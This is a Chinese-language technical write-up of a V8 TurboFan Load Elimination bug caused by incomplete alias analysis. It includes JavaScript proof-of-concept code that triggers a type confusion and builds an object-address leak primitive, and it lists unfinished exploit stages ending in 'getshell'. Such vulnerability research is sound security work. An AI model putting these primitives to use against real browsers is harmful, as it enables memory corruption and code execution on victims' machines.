# 1.概述

Load Elimination是TurboFan优化的第7步，在Loop Peeled（将第一次循环剥离开）之后，在Escape Analysis（JIT内部创建的对象的作用范围的分析）之前。这一步实际上是分析了程序到达图中的每一个节点时，该JIT函数的作用域中所有的Object及其Elements和Fields可能是什么。如果不确定是什么，则不记录，认为是什么都有可能；如果可以确定，则把它记录到一个State的状态中去，并让State沿着数据流图进行传递。分析这个的意义在于我们拿到当前的State，可以发现部分Load或者Check之类的节点是冗余的，由此我们可以简化整个IR图实现性能优化。


# 2.root cause: 别名分析不完全

poc:

```js

function opt(a, b) {
    b[0] = 0;    // state中包含b的map check以及b[0]的store state

    a.length;    // state中包含a的map check以及a.length的Field

    // TransitionElementsKind 
    for (let i = 0; i < 1; i++)
        a[0] = 0;    // state中包含a[0]的load state，并且将a的map修改为object Elements的(因为优化之前传入的arr1是object elements的)

    // CheckMap removed, type confusion
    b[0] = 9.431092e-317;  // 0x1234567      // 由于此时state中包含了b[0]的store state，所以checkmap被移除，直接完成赋值
                                             // 但是如果我们传入的a和b是同一个数组，由于a的elements类型被转换成了object elements
                                             // 此时9.431092e-317(二进制为0x1234567)会被当成是一个指针，进而在之后的访问过程中crash
}

let arr1 = new Array(1);
arr1[0] = 'a';
opt(arr1, [0]);

let arr2 = [0.1];
opt(arr2, arr2);    

%OptimizeFunctionOnNextCall(opt);

opt(arr2, arr2);    // arr2是double的
arr2[0].x  // access 0x1234566

```


# 3.exploit

## 3.1 用户空间对象引用获取：

上述poc已经完美的构造出了用户空间对象引用获取的利用过程

## 3.2 用户空间对象地址泄露：

```js
    function opt(a, b, leak) {
        b[0];    // state中包含b的map check以及b[0]的load state(double load)

        a.length;    
        // TransitionElementsKind 
        for (let i = 0; i < 1; i++)
            a[0] = leak;    // state中包含a[0]的load state，并且将a的map修改为object Elements的(因为优化之前传入的arr1是object elements的)

        // CheckMap removed, type confusion
        return b[0];      // 由于此时state中包含了b[0]的load state(double load)，所以checkmap被移除，直接完成load
                          // 但是如果我们传入的a和b是同一个数组，由于a的elements类型被转换成了object elements
                          // 此时b[0]实际上存储的是leak object,进而直接讲leak object的地址当成是double返回
    }
```

## 3.3 fake arraybuffer

## 3.4 通过用户空间对象引用获取模块获取fake arraybuffer引用

## 3.5 获取任意地址读写

## 3.6 getshell